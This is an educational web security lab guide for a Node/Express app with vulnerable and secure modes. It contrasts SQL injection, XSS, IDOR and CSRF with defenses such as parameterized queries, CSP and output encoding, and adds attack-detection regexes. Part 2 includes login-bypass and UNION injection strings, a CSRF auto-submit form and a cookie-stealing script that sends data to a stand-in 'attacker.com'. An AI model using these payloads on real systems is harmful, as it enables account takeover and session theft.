# 🔐 Web Security Lab - Complete Educational Guide

## Overview

This security lab teaches you about web security through hands-on practice. It includes both **VULNERABLE** and **SECURE** modes to demonstrate attack vectors and their defenses.

**⚠️ IMPORTANT: This is for educational purposes only. Never use these techniques on systems you don't own or have permission to test.**

---

## 🚀 Getting Started

### Access the Lab
- **Web Interface**: https://work-1-drcprwshxgiicojq.prod-runtime.all-hands.dev
- **API Base URL**: https://work-1-drcprwshxgiicojq.prod-runtime.all-hands.dev/api

### Running Modes

```bash
# Vulnerable Mode (for learning attacks)
SECURE_MODE=false node server.js

# Secure Mode (for learning defenses)
SECURE_MODE=true node server.js
```

### Test Credentials
| Username | Password | Role |
|----------|----------|------|
| admin | admin_secret_2024 | admin |
| alice | password123 | user |
| bob | password123 | user |

---

## 📚 Part 1: Building a Robust Website

### 1.1 Security Headers (Helmet.js)

Security headers protect against various attacks:

```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],  // Prevents inline scripts (XSS protection)
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],  // Prevents clickjacking
    },
  },
}));
```

**Headers Added:**
- `Content-Security-Policy` - Controls resource loading
- `X-Frame-Options` - Prevents clickjacking
- `X-Content-Type-Options` - Prevents MIME sniffing
- `Strict-Transport-Security` - Forces HTTPS
- `X-XSS-Protection` - Browser XSS filter

### 1.2 Rate Limiting

Prevents brute force and DoS attacks:

```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // 100 requests per window
});

// Stricter limit for login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5 // Only 5 login attempts
});
```

### 1.3 Secure Session Management

```javascript
app.use(session({
  secret: crypto.randomBytes(32).toString('hex'), // Random secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // No JavaScript access
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000    // 1 hour expiry
  }
}));
```

### 1.4 Input Validation

```javascript
function validateInput(input, type) {
  const patterns = {
    username: /^[a-zA-Z0-9_]{3,20}$/,
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    alphanumeric: /^[a-zA-Z0-9\s]+$/
  };
  return patterns[type]?.test(input) ?? false;
}
```

### 1.5 Output Encoding (XSS Prevention)

```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

---

## 🎯 Part 2: Common Attack Vectors

### 2.1 SQL Injection

**What is it?**
SQL injection occurs when user input is directly concatenated into SQL queries, allowing attackers to manipulate the query logic.

**Vulnerable Code:**
```javascript
// ❌ NEVER DO THIS
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Attack Examples:**

1. **Authentication Bypass:**
   ```
   Username: admin'--
   Password: anything
   
   Resulting query:
   SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
   
   The -- comments out the password check!
   ```

2. **Always True Condition:**
   ```
   Username: ' OR '1'='1'--
   Password: x
   
   Resulting query:
   SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = 'x'
   
   Returns the first user (usually admin)!
   ```

3. **UNION-based Data Extraction:**
   ```
   Search: ' UNION SELECT id, username, password, role, created_at FROM users--
   
   Extracts password hashes from the database!
   ```

**Secure Code:**
```javascript
// ✅ ALWAYS USE PARAMETERIZED QUERIES
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
```

**Try it:**
```bash
# Vulnerable mode - SQL injection works
curl -X POST http://localhost:12000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "x"}'

# Secure mode - SQL injection blocked
SECURE_MODE=true node server.js
# Same attack will fail
```

---

### 2.2 Cross-Site Scripting (XSS)

**What is it?**
XSS allows attackers to inject malicious scripts that execute in other users' browsers.

**Types of XSS:**

1. **Reflected XSS** - Payload in URL/request, reflected back immediately
2. **Stored XSS** - Payload saved in database, affects all viewers
3. **DOM-based XSS** - Payload manipulates client-side JavaScript

**Attack Examples:**

1. **Basic Alert:**
   ```html
   <script>alert('XSS!')</script>
   ```

2. **Cookie Stealing:**
   ```html
   <script>
   fetch('https://attacker.com/steal?cookie=' + document.cookie)
   </script>
   ```

3. **Event Handler:**
   ```html
   <img src=x onerror="alert('XSS')">
   <div onmouseover="alert('XSS')">Hover me</div>
   ```

4. **JavaScript Protocol:**
   ```html
   <a href="javascript:alert('XSS')">Click me</a>
   ```

**Prevention:**
```javascript
// 1. Output encoding
const safeContent = escapeHtml(userInput);

// 2. Content Security Policy
Content-Security-Policy: script-src 'self'

// 3. HttpOnly cookies
cookie: { httpOnly: true }
```

**Try it:**
```bash
# Create a post with XSS payload (vulnerable mode)
curl -X POST http://localhost:12000/api/posts \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=YOUR_SESSION" \
  -d '{"title": "XSS Test", "content": "<script>alert(1)</script>"}'
```

---

### 2.3 Insecure Direct Object Reference (IDOR)

**What is it?**
IDOR occurs when an application exposes internal object references without proper authorization checks.

**Vulnerable Code:**
```javascript
// ❌ No authorization check
app.get('/api/users/:id', (req, res) => {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  res.json({ user });
});
```

**Attack:**
```bash
# As user "alice" (id=2), access admin's profile (id=1)
curl http://localhost:12000/api/users/1 \
  -H "Cookie: connect.sid=ALICE_SESSION"
```

**Secure Code:**
```javascript
// ✅ Proper authorization
app.get('/api/users/:id', requireAuth, (req, res) => {
  if (req.session.userId != req.params.id && req.session.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  // ... fetch user
});
```

---

### 2.4 Cross-Site Request Forgery (CSRF)

**What is it?**
CSRF tricks authenticated users into performing unwanted actions.

**Attack Scenario:**
```html
<!-- Malicious page on attacker's site -->
<form action="https://bank.com/transfer" method="POST" id="evil">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('evil').submit();</script>
```

**Prevention:**
```javascript
// 1. SameSite cookies
cookie: { sameSite: 'strict' }

// 2. CSRF tokens
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// 3. Verify Origin header
if (req.headers.origin !== 'https://yoursite.com') {
  return res.status(403).json({ error: 'Invalid origin' });
}
```

---

## 🔍 Part 3: Attack Detection

### 3.1 Pattern-Based Detection

```javascript
const ATTACK_PATTERNS = {
  SQL_INJECTION: [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)\b)/i,
    /('|"|;|--)/,
    /(\bOR\b|\bAND\b).*?[=<>]/i
  ],
  XSS: [
    /<script\b[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i
  ],
  PATH_TRAVERSAL: [
    /\.\.\//,
    /%2e%2e/i
  ]
};

function detectAttack(input) {
  for (const [type, patterns] of Object.entries(ATTACK_PATTERNS)) {
    for (const pattern of patterns) {
      if (pattern.test(input)) {
        return type;
      }
    }
  }
  return null;
}
```

### 3.2 Security Logging

```javascript
const winston = require('winston');

const logger = winston.createLogger({
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ]
});

function logSecurityEvent(type, req, details) {
  logger.warn('SECURITY EVENT', {
    type,
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    details,
    timestamp: new Date().toISOString()
  });
}
```

### 3.3 Anomaly Detection Indicators

Watch for:
- Multiple failed login attempts from same IP
- Unusual request patterns (high frequency, odd hours)
- SQL keywords in input fields
- HTML/JavaScript in text inputs
- Sequential ID enumeration
- Requests to non-existent endpoints

---

## 🛡️ Part 4: Prevention Best Practices

### 4.1 Defense in Depth Checklist

```
□ Input Validation
  □ Whitelist allowed characters
  □ Validate data types and lengths
  □ Sanitize before storage

□ Output Encoding
  □ HTML encode for HTML context
  □ JavaScript encode for JS context
  □ URL encode for URL context

□ Authentication
  □ Strong password requirements
  □ Account lockout after failed attempts
  □ Multi-factor authentication
  □ Secure password storage (bcrypt)

□ Authorization
  □ Principle of least privilege
  □ Role-based access control
  □ Verify permissions on every request

□ Session Management
  □ Secure, HttpOnly, SameSite cookies
  □ Session timeout
  □ Regenerate session ID on login

□ Security Headers
  □ Content-Security-Policy
  □ X-Frame-Options
  □ X-Content-Type-Options
  □ Strict-Transport-Security

□ Database Security
  □ Parameterized queries
  □ Least privilege DB user
  □ Encrypted connections

□ Logging & Monitoring
  □ Log security events
  □ Monitor for anomalies
  □ Alert on suspicious activity

□ Error Handling
  □ Generic error messages to users
  □ Detailed logs for developers
  □ No stack traces in production
```

### 4.2 Secure Coding Patterns

**Authentication:**
```javascript
// Hash passwords with bcrypt
const hashedPassword = await bcrypt.hash(password, 12);

// Compare passwords securely
const isValid = await bcrypt.compare(inputPassword, storedHash);
```

**Database Queries:**
```javascript
// Always use parameterized queries
const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);

// For dynamic queries, use query builders
const query = db.prepare(`
  SELECT * FROM posts 
  WHERE user_id = ? 
  ORDER BY created_at DESC 
  LIMIT ?
`).all(userId, limit);
```

**API Responses:**
```javascript
// Don't expose sensitive data
res.json({
  user: {
    id: user.id,
    username: user.username,
    // ❌ Never include: password, passwordHash, internalId, etc.
  }
});
```

---

## 🧪 Part 5: Testing Your Knowledge

### Exercise 1: SQL Injection
1. Start the server in vulnerable mode
2. Try to login as admin without knowing the password
3. Extract all user passwords using UNION injection
4. Switch to secure mode and verify the attacks fail

### Exercise 2: XSS
1. Create a post with a script tag payload
2. View the posts page and observe the script execution
3. Try different XSS payloads (img onerror, event handlers)
4. Switch to secure mode and verify encoding works

### Exercise 3: IDOR
1. Login as alice (regular user)
2. Try to access admin's profile (user ID 1)
3. Try to access bob's profile (user ID 3)
4. Switch to secure mode and verify access is denied

### Exercise 4: Detection
1. Perform various attacks
2. Check the security logs
3. Identify which attacks were detected
4. Understand the detection patterns

---

## 📖 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)

---

## ⚠️ Legal Disclaimer

This lab is for educational purposes only. Only test on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.

**Remember:** With great power comes great responsibility. Use your security knowledge to protect, not to harm.
